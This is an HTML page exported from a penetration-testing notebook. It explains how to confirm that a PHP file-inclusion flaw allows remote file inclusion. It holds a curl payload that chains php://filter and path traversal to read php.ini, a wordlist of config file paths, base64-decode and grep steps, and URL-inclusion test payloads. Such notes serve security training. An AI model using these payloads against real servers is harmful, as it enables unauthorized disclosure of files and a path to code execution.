<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>1. Verify RFI</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>1. Verify RFI</h1><br/><br />Any remote URL inclusion in PHP would require the <code>allow_url_include</code> setting to be enabled. <br /><br /><br /><strong>1. Read PHP Configurations through “</strong><a href="tation--Server-side--File_Inclusion--Local_File_Inclusion(LFI)_File_Disclosure--PHP_Filters_(PHP_Wrappers)--2._PHP_Source_Code_Disclosure.html">PHP Source Code Disclosure</a><strong>”</strong><br /><span style="text-decoration:underline;">NOTE:</span> if the WebApp is hosted on Windows Server we can try directly a <a href="-WebApp_Pentest--Exploitation--Server-side--File_Inclusion--Remote_Code_Execution_(RCE)--Remote_FIle_Inclusion_(RFI)--2._RCE__through_RFI.html">RCE through RFI with SMB</a> <br />Server Configuration wordlist for linux: <a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux</a> that include also PHP configurations file.<br />• To get only php.ini files:<br />    <div class="codebox"><pre>wget https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux; cat LFI-WordList-Linux | grep &#39;php.ini&#39;</pre></div><br />    <div class="codebox"><pre>/apache/php/php.ini<br />/bin/php.ini<br />/etc/httpd/php.ini<br />/etc/php.ini<br />/etc/php/apache/php.ini<br />/etc/php/apache2/php.ini<br />/etc/php/cgi/php.ini<br />/etc/php/php.ini<br />/etc/php/php4/php.ini<br />/etc/php4.4/fcgi/php.ini<br />/etc/php4/apache/php.ini<br />/etc/php4/apache2/php.ini<br />/etc/php4/cgi/php.ini<br />/etc/php5/apache/php.ini<br />/etc/php5/apache2/php.ini<br />/etc/php5/cgi/php.ini<br />/home/bin/stable/apache/php.ini<br />/home2/bin/stable/apache/php.ini<br />/NetServer/bin/stable/apache/php.ini<br />/opt/xampp/etc/php.ini<br />/php/php.ini<br />/php4/php.ini<br />/php5/php.ini<br />/usr/lib/php.ini<br />/usr/lib/php/php.ini<br />/usr/local/apache/conf/php.ini<br />/usr/local/etc/php.ini<br />/usr/local/lib/php.ini<br />/usr/local/php/lib/php.ini<br />/usr/local/php4/lib/php.ini<br />/usr/local/php5/lib/php.ini<br />/usr/local/psa/admin/conf/php.ini<br />/usr/local/Zend/etc/php.ini<br />/var/local/www/conf/php.ini<br />/web/conf/php.ini<br /></pre></div><br />• PHP configuration file can also be found in:<br />   ◇ Apache → /etc/php/X.Y/apache2/php.ini<br />   ◇ Nginx → /etc/php/X.Y/fpm/php.ini<br />	*where X.Y is the PHP version of the webapp<br />    where the PHP version available are:<br />	<div class="codebox"><pre>8.1<br />8.0<br />7.4<br />7.3<br />7.2<br />7.1<br />7.0<br />5.6<br />5.5<br />5.4<br />5.3<br />5.2<br />5.1<br />5.0<br />4.4<br />4.3<br />4.2<br />4.1<br />4.0</pre></div><br />Since .ini files are similar to PHP files we can use the same method used in <a href="tation--Server-side--File_Inclusion--Local_File_Inclusion(LFI)_File_Disclosure--PHP_Filters_(PHP_Wrappers)--2._PHP_Source_Code_Disclosure.html">PHP Source Code Disclosure</a><br /><div class="codebox"><pre>$ curl <span style="color:#3ad900;font-weight:400">&quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;</span></pre></div><br /><br />Once we have the base64 encoded string, we can decode it and <span style="text-decoration:underline;">grep</span> for <code>allow_url_include</code> (NOT enabled by default) to see its value that to work must be set to “<strong>On</strong>”<br /><div class="codebox"><pre>$ echo <span style="color:#3ad900;font-weight:400">&#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39;</span> | base64 -d | grep allow_url_include</pre></div><br />    or<br /><div class="codebox"><pre>cat encoded.txt | base64 -d | grep -E &#39;allow_url_include|expect&#39;</pre></div><br />	<code>allow_url_include = On</code><br />    <a href=""><img src="images/2357-1.png" alt="images/2357-1.png" /></a><code><br /></code>If the option <em>allow_url_include</em> (NOT enabled by default) is enabled(On), <span style="text-decoration:underline;">we can use the Input wrapper</span>.<br />Many web applications rely on <code>allow_url_include</code> to function properly, like:<br />   ◇ WordPress plugins<br />   ◇ Wordpress themes<br />   ◇ ....<br /><br /><br /><strong>2. The point 1 is not always reliable</strong><br /><span style="text-decoration:underline;">Even if this setting is enabled, the vulnerable function may not allow remote URL inclusion</span>. <br />As we can see from table in the Cheat Sheet → <a href="Home--Penetration_Test_Methodology--WebApp_Pentest--Exploitation--Server-side--File_Inclusion--Cheat_Sheet--Vulnerable_Functions_Table.html">Vulnerable Functions Table</a>, not all LFI vulnerable functions are vulnerable to RFI.<br />A more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to <span style="text-decoration:underline;">simply try and include a URL</span>, and see if we can get its content.<br />   ◇ inlude a page on the host or in the internal network<br />      First, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. <br />	<span style="color:#a52a2a;">example:</span> index.php?lnguage=<span style="background-color:#2ec27e;">http://127.0.0.1:</span><span style="color:#ffa500;background-color:#2ec27e;">80</span><span style="background-color:#2ec27e;">/</span><span style="color:#a020f0;background-color:#2ec27e;">index.php</span><br />    Note: is not ideal include the vulnerable page itself (int his case index.php) as this may cause a recursive inclusion loop and cause a DoS to the back-end server.<br />    <a href=""><img src="images/2357-2.png" alt="images/2357-2.png" /></a><br />         - If the <span style="color:#a020f0;">Index page</span> get include in the vulnerable section of the actual page, the page is vulnerable to RFI<br />         - If the <span style="color:#a020f0;">Index page</span> get execute and rendered as PHP instead showing the source code, means that the vulnerable function also allow PHP execution<br />             <span style="text-decoration:underline;">Note</span>: If we specify also the <span style="color:#ffa500;">port</span> (example: 80) there is also the possibility to access to other pages/resources on other <span style="color:#ffa500;">ports</span> (example: 8080) otherwise restricted<br />   ◇ include a website on the internet<br />      <span style="color:#865e3c;">example:</span>  index.php?lnguage=<span style="background-color:#2ec27e;">http://www.google.com</span><br />    If it is vulnerable, the HTML code of google.com should be injected in the vulnerable web page.<br /><br /><br /></div>
</body>
</html>
